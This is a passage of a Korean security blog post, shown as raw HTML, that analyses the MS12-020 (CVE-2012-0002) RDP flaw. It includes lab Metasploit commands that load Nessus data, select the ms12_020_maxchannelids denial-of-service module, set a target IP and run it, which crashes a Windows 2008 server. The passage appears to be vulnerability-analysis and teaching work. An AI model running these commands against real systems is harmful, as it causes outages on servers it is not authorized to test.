srcset=\"/static/304e57f44cea8f8eb27504749eafba40/e9ff0/image9.png 180w,\n/static/304e57f44cea8f8eb27504749eafba40/f21e7/image9.png 360w,\n/static/304e57f44cea8f8eb27504749eafba40/f058b/image9.png 630w\"\n        sizes=\"(max-width: 630px) 100vw, 630px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">workspace <span class=\"token operator\">-</span>a \\<span class=\"token operator\">&lt;</span>작업 공간\\<span class=\"token operator\">></span>  \\# 작업 공간 추가\n\nworkspace \\<span class=\"token operator\">&lt;</span>작업 공간\\<span class=\"token operator\">></span>     \\# 작업 공간 이동</code></pre></div>\n<h3 id=\"metasploit-db-연결-상태-확인-및-가져오기\" style=\"position:relative;\"><a href=\"#metasploit-db-%EC%97%B0%EA%B2%B0-%EC%83%81%ED%83%9C-%ED%99%95%EC%9D%B8-%EB%B0%8F-%EA%B0%80%EC%A0%B8%EC%98%A4%EA%B8%B0\" aria-label=\"metasploit db 연결 상태 확인 및 가져오기 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Metasploit DB 연결 상태 확인 및 가져오기</h3>\n<p>데이터베이스 상태를 확인한 후 만약 실패로 나온다면 PostgreSQL 서비스를\n키도록 한다. db_import 명령을 통해 다운 받은 Nessus DB 결과 정보를\n불러온다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 35.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAzElEQVQY06WQ7WqDMBRA+zIzRpNYmNebL6XNYkzVrq7DsfX9H2S0hbYO9mMMDgfuj3Mv3FUXv0I39eOsTIDKmbpD5VH5uom2iRmTaVbRvLr5kVWz/Rz2826Y2zAd3k79OMf+vdkMqLwyLaGQpGWSwoUySctFrO1pfP3w4dB2U9wdty/7EI/aBkAntZf6vALQATqUHtDRHO+xqSMTiuaYMZlzeTUvjFhbsba8MLwwTGgmNC/OXlx+Is+EwnUgFAitLsBvLOIfP/gT/4q/AT64VIaKS7LEAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image10\"\n        title=\"image10\"\n        src=\"/static/8d4ff2f976488f36ba8b794b3f405248/d8f62/image10.png\"\n        srcset=\"/static/8d4ff2f976488f36ba8b794b3f405248/e9ff0/image10.png 180w,\n/static/8d4ff2f976488f36ba8b794b3f405248/f21e7/image10.png 360w,\n/static/8d4ff2f976488f36ba8b794b3f405248/d8f62/image10.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">db_status               \\# DB 상태 확인\n\ndb_import \\<span class=\"token operator\">&lt;</span>파일 경로\\<span class=\"token operator\">></span>   \\# DB 불러오기</code></pre></div>\n<h3 id=\"점검-대상-서비스-정보-확인\" style=\"position:relative;\"><a href=\"#%EC%A0%90%EA%B2%80-%EB%8C%80%EC%83%81-%EC%84%9C%EB%B9%84%EC%8A%A4-%EC%A0%95%EB%B3%B4-%ED%99%95%EC%9D%B8\" aria-label=\"점검 대상 서비스 정보 확인 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>점검 대상 서비스 정보 확인</h3>\n<p>services 명령을 통해 서비스 정보를 확인한 결과 점검 대상인 msrdp/3389\n서비스가 열러 있음을 확인할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.222222222222214%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAvElEQVQY05XNWxKCIBiG4RbTlMes8CeBKEQUwULTTvftfw+NG9Ca+S6+m2feha77A1FhTLwA/7tFivPlCgVRtkenFAsEwgvwbvwyjMnahylcm17Ii5ANApERxc9mu+f8bOKEzZdd+7bNvdI3Qkt61JRVKYiidGGcTWdHXNlBKieUA6KAFEAKL8rYyQS/4Gf3ak3fNYMtrwXX8qghYZeq3WzoPP64x1N37/o2qKtlqhV1jnifW5zQlQ/+JP4C0eBWsgh+PMgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image11\"\n        title=\"image11\"\n        src=\"/static/4cbacd65a023b957fe7c9c22e2af4b41/32056/image11.png\"\n        srcset=\"/static/4cbacd65a023b957fe7c9c22e2af4b41/e9ff0/image11.png 180w,\n/static/4cbacd65a023b957fe7c9c22e2af4b41/f21e7/image11.png 360w,\n/static/4cbacd65a023b957fe7c9c22e2af4b41/32056/image11.png 602w\"\n        sizes=\"(max-width: 602px) 100vw, 602px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">services\n\n\\# <span class=\"token number\">192.168</span><span class=\"token number\">.111</span><span class=\"token number\">.146</span>     <span class=\"token number\">3389</span>     tcp         msrdp         <span class=\"token builtin\">open</span></code></pre></div>\n<h3 id=\"점검-대상-호스트-정보\" style=\"position:relative;\"><a href=\"#%EC%A0%90%EA%B2%80-%EB%8C%80%EC%83%81-%ED%98%B8%EC%8A%A4%ED%8A%B8-%EC%A0%95%EB%B3%B4\" aria-label=\"점검 대상 호스트 정보 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>점검 대상 호스트 정보</h3>\n<p>점검 대상 호스트 정보를 통해 네트워크 분류 기준을 정할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 25.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAmklEQVQY01VPiw6EIAzzZw4RBETGQMTHaUz8/y+6KAnZJc3SZuu6NXm9h3HhAgvazpdaCOPwcmDcF14nucAmpuvTQq9T0cZmxh+pzCzVNMJmbH7rArgrk6i/yevt/A74HWGzbvXhMHbBcMZ06WEuTh8OZWY9ZKli25FkjId1WyeD6COFVFP9QvSh8r+zGX/+eXtItno6StOo+QcArDhv4/CKhQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image12\"\n        title=\"image12\"\n        src=\"/static/a06db8ccbf35e86183e38a2c70d5f65a/d8f62/image12.png\"\n        srcset=\"/static/a06db8ccbf35e86183e38a2c70d5f65a/e9ff0/image12.png 180w,\n/static/a06db8ccbf35e86183e38a2c70d5f65a/f21e7/image12.png 360w,\n/static/a06db8ccbf35e86183e38a2c70d5f65a/d8f62/image12.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">hosts\n\n\\# <span class=\"token number\">192.168</span><span class=\"token number\">.111</span><span class=\"token number\">.146</span>   <span class=\"token number\">00</span><span class=\"token punctuation\">:</span>0c<span class=\"token punctuation\">:</span><span class=\"token number\">29</span><span class=\"token punctuation\">:</span>c2<span class=\"token punctuation\">:</span>1b<span class=\"token punctuation\">:</span>da  <span class=\"token number\">192.168</span><span class=\"token number\">.111</span><span class=\"token number\">.146</span>   Windows <span class=\"token number\">2008</span>  SP1   server</code></pre></div>\n<h3 id=\"취약점-검색\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EA%B2%80%EC%83%89\" aria-label=\"취약점 검색 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 검색</h3>\n<p>RDP 서비스에서 발생한 취약점 MS12-020을 기준으로 검색을 진행한다. 실제로\n검사 대상이 취약한지를 테스트하기 위해 Metasploit framework 모듈을 통해\n공격을 진행 한다.</p>\n<p><img src=\"./image13.png\" alt=\"\"></p>\n<p>search ms12-020</p>\n<p>use auxiliary/dos/windows/rdp/ms12_020_maxchannelids</p>\n<h3 id=\"ms12_020_maxchannelids-모듈\" style=\"position:relative;\"><a href=\"#ms12_020_maxchannelids-%EB%AA%A8%EB%93%88\" aria-label=\"ms12_020_maxchannelids 모듈 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ms12_020_maxchannelids 모듈</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 547px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 40.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7DAAAOwwHHb6hkAAABzUlEQVQY0zXKz2vTUADA8fwpKkMQQaUMQdR2VUS0mwpzExVR59DRbhMsA10HQk9uBxH05LHa2jrH2s6KJ8X7bNMkIykh7ZZke2lefti9vOSFhiLr6OfwPX2pc+evTEw+5DiOpularcYwDD3AHGA3N/9Wq1WGYcYnHoxcGqXpuiRJLMtCCKkL4at370+7rocxtkxD0wCEuq63TdMwTQNC3bYtz3Uxxo+m4rHRyWazhR1kGNAnhDpx8mz08tj7Dx+XV97FEy9evnqdWko/m3m+mEonZpNPZ+bn5hcWl9LJhdTYjTuh4fDjJ/HZueTUdOLN8lvqTOjitdjtUul7Llf4kl8tFjfK5Uq+8G29uFEqV76urn/O5jOfcplMrvLj59paMZs92LK5wq/ff6ih46FINLarqq1W08XYskxVVRwHybJs2xYhnqoqe3u7srzTlKSd7W1NA4os+z7B2KGOHDsVHrm+v49EUdzqEwThsCzLCoLAcVuNRoPnhXq9zvO8oigQQgCADiEVGo7cvHWv2+06jgMA8H0/CALP8xBCjuMQQg6L+ggheAAhRB0dOh2JxoIg0DRNFEVd1yGE7Xbb7IMQdjodAIBt2//6zIFer/cfbZZluBtvbPgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 2 8 7\"\n        title=\"image 2 8 7\"\n        src=\"/static/2a82d58915e2cb55e7be55b723889f38/977f7/image-2.8.7.png\"\n        srcset=\"/static/2a82d58915e2cb55e7be55b723889f38/e9ff0/image-2.8.7.png 180w,\n/static/2a82d58915e2cb55e7be55b723889f38/f21e7/image-2.8.7.png 360w,\n/static/2a82d58915e2cb55e7be55b723889f38/977f7/image-2.8.7.png 547w\"\n        sizes=\"(max-width: 547px) 100vw, 547px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">※ T<span class=\"token punctuation\">.</span><span class=\"token number\">125</span><span class=\"token punctuation\">:</span> 원격 회의<span class=\"token punctuation\">,</span> 화상 회의 및 컴퓨터 지원 공동 작업을 위한 지점 간\n통신 프로토콜 모음이며 애플리케이션 공유<span class=\"token punctuation\">,</span> 온라인 채팅<span class=\"token punctuation\">,</span> 파일 공유 및 기타\n기능 제공</code></pre></div>\n<h2 id=\"모듈-옵션-설정\" style=\"position:relative;\"><a href=\"#%EB%AA%A8%EB%93%88-%EC%98%B5%EC%85%98-%EC%84%A4%EC%A0%95\" aria-label=\"모듈 옵션 설정 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>모듈 옵션 설정</h2>\n<p><img src=\"./image14.png\" alt=\"\"></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token builtin\">set</span> RHOST <span class=\"token number\">192.168</span><span class=\"token number\">.111</span><span class=\"token number\">.146</span>\n\nshow options</code></pre></div>\n<h2 id=\"공격\" style=\"position:relative;\"><a href=\"#%EA%B3%B5%EA%B2%A9\" aria-label=\"공격 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>공격</h2>\n<p>대상 서버를 대상으로 MS12-020 취약점 모듈을 실행한 결과 분석된 결과와\n동일하게 BSOD가 발생한 것을 확인할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 11.666666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAbUlEQVQI113GUQ6DIAwAUG8zx5Jls1RjolCcUEowwszuf5XFX5P38Zph3IOU1ReW72wlcF1DYTloySn/ohyTiYAWkDQ6QNdpeoMBbdVjaHBOHKuP1XM1lMKZQks2lNxn67R9vqZW9bc7XrSq/wNZrRzj9WAeJQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image15\"\n        title=\"image15\"\n        src=\"/static/166a87a3e754290df73519dbb1b26e6b/d8f62/image15.png\"\n        srcset=\"/static/166a87a3e754290df73519dbb1b26e6b/e9ff0/image15.png 180w,\n/static/166a87a3e754290df73519dbb1b26e6b/f21e7/image15.png 360w,\n/static/166a87a3e754290df73519dbb1b26e6b/d8f62/image15.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">exploit  \\#run 명령을 사용해도 된다<span class=\"token punctuation\">.</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 349px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 75%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAA7EAAAOxAGVKw4bAAACe0lEQVQoz1WSWW+bQBDHFzDgAJtluTHmsmU7seWHPOVT9SlppTZqE5v7xnYcqf20LZBYqfTXaGakOfa3A0wz1rQIwh3LPnPcy3j8TNM/AfjR6+mT8/S/8wuAL0BRSoRyUcwnk8Y0a9NsNK0ajxOezzgu4bj04kCYEUQIQAhAAEAMwFcwmx2m09qyKk0rNa3k+USWC4wzw6gMo8sYRqUoXUZVCwBePhQB8Ahct1XVwjRrhFJRzBQlxziX5QKhDMJE0wpRzAQh0fVSFDNZzg2j5Pn4vdiyatOsHKf1/YPnHVy3dZzWdbvQNCtJ6hrxfKIohSTlktS1vr5OSTIG4AHoejmfHy2rNozK89rptF4sjppWeF5rWbWqFpZV63rpuo1pVrbdOE5LUfv+5Y9guTwul6ft9s33u2m+3y4WJ89rV6vTfH7w/cNqdZrN2u32zXEa121vbl5ZNnwvnky63XS9AyMIKUnuex673u577Qhi32d2ffgCwHNf/AAUpdC0UlEK2+4WE8UMoQzjbGB+fZ1inItiJkk5Qu+hLOcYl4LwHahqYRilrpeWVQtCQpIBy0YsG7NsxDARTUfjcTyIYUKaDhkmurqKGCalqK+A4xKWjWQ557iYpkNZLgQhgTAd8IpiBmHKcfEAXJY74DwfI1Rg/AQg7DZh2Ygk9yS5p6iAIAKC2NN0OGg0CigqoKiQpqNhOEUFo1FC09/A8BPTaWPbjSTlqlo4TmMYFUkGnyBdgF3UA7u//7PZnO/ufq/Xr+v1eb0+bzbn29szxhlFBR/FlxaXRv2FLRbdhXjewbab2ewwnx+HFWQ5hzDtbTJcKEIZQimECcYZz+f/Jv8FSwTCfrPG1vgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image16\"\n        title=\"image16\"\n        src=\"/static/f26dc4540ea4c19762d5b84c939c62c5/e9bf8/image16.png\"\n        srcset=\"/static/f26dc4540ea4c19762d5b84c939c62c5/e9ff0/image16.png 180w,\n/static/f26dc4540ea4c19762d5b84c939c62c5/e9bf8/image16.png 349w\"\n        sizes=\"(max-width: 349px) 100vw, 349px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h1 id=\"분석-개요\" style=\"position:relative;\"><a href=\"#%EB%B6%84%EC%84%9D-%EA%B0%9C%EC%9A%94\" aria-label=\"분석 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>분석 개요</h1>\n<h2 id=\"취약점-분석-배경\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-%EB%B0%B0%EA%B2%BD\" aria-label=\"취약점 분석 배경 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석 배경</h2>\n<p>외부망에 노출되어 있는 RDP 프로토콜은 해킹을 통해 시스템을 완전히 제어가\n가능하기 때문에 대상 목록상 우선이 되곤 한다. 또한 공격자가 정상적인\n프로토콜을 통해 시스템에 접속을 하기 때문에 보안 관리자가 악의적인\n활동을 탐지하기 어렵다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABV0lEQVQY02WQT0+CcByHeWupuOY/wJkgE/ozM8rNVfM1dOrgybdRq0NtXurUViv8oSJoa61Qi7lsE0T5Ab8GtNbqu+/hc3kOz4Oh3+d538N1EUJmXxGzcVnguuVir1pqr689ZFZEChfJWPiY5zjQmJn6+0J7dS3LhdCeftgTHXmeD1OxNp/rbDGATobAQyYisUR3p9jKrWIuhHrz8qlRt0ZDYzzSzk6ej49eGvWFrpsDVaTwbrmo1iqdbVYkoiEMCmnlUAD5BIYQcubzt+aFNZl8Dvrj6yvt/FS/vUEIGWovgLletSQLPGBSPk9EAZ1Qa7uASWGhJzSM6f0dNE1jqCGEZoO+C6H5qIpkTBZ4WeAkjmzzWV84E2nRSWW/HMBhINt2lsufbF6wg2C4XNmU9zYklgB0SiRxkYi28gnlQABMGvtX2/tTG+SToJCWWDKAg84U7itk41+oaCvbTT4b4wAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image17\"\n        title=\"image17\"\n        src=\"/static/7e9e0942781196febe56538f7eac7f0e/32056/image17.png\"\n        srcset=\"/static/7e9e0942781196febe56538f7eac7f0e/e9ff0/image17.png 180w,\n/static/7e9e0942781196febe56538f7eac7f0e/f21e7/image17.png 360w,\n/static/7e9e0942781196febe56538f7eac7f0e/32056/image17.png 602w\"\n        sizes=\"(max-width: 602px) 100vw, 602px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>국가별 빈도</p>\n<p>출처: <a href=\"https://www.shodan.io/\">https://www.shodan.io/</a></p>\n<p>특히 최근에는 원격 화상회의 등 원격 업무 비율이 높아짐에 따라 RDP\n서비스를 사용하는 빈도율이 높아져 사이버 범죄에 노출 여부가 커지고 있다.\n동시에 기업 내에서는 RDP 서비스를 사용함에도 불구하고 인증 체계를\n사용하지 않거나 접근 통제를 실시하지 않는 등 업데이트를 크게 중요시하지\n않는 등 보안적으로 미흡이 되는 부분이 많다.</p>\n<p>이번 분석에서는 RDP 프로토콜을 통한 서비스 거부 공격에 쓰이는\nCVE-2012-0002를 분석할 것이다.</p>\n<h2 id=\"cve-2012-0002-취약점-요약\" style=\"position:relative;\"><a href=\"#cve-2012-0002-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%9A%94%EC%95%BD\" aria-label=\"cve 2012 0002 취약점 요약 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>CVE-2012-0002 취약점 요약</h2>\n<p>2012년 3월 14일 마이크로소프트는 비공개적으로 보고된 CVE-2012-0002의\n원격 데스크톱 취약점을 패치하기 위해 MS12-020 긴급 업데이트를\n진행하였다. 원격 데스크톱은 사용자들에게 빈도성이 높은 프로토콜로\nExploit 코드가 공개될 시 악용될 위험성이 매우 놓은 취약점이다. RDP\n프로토콜은 데스크톱에 가상 세션을 만들어 이를 통해 사용자가 원격으로\n컴퓨터에 있는 모든 데이터와 애플리케이션에 접근할 수 있게 한다. 공격자가\nRDP의 취약점을 이용하면서 악성 코드를 설치하거나 프로그램을 삭제하는 등\n사용자의 시스템을 완전히 제어할 수 있다. 2012년 3월까지는 서비스 거부\n공격 코드만 공개되고 원격에서 실행 가능한 공격 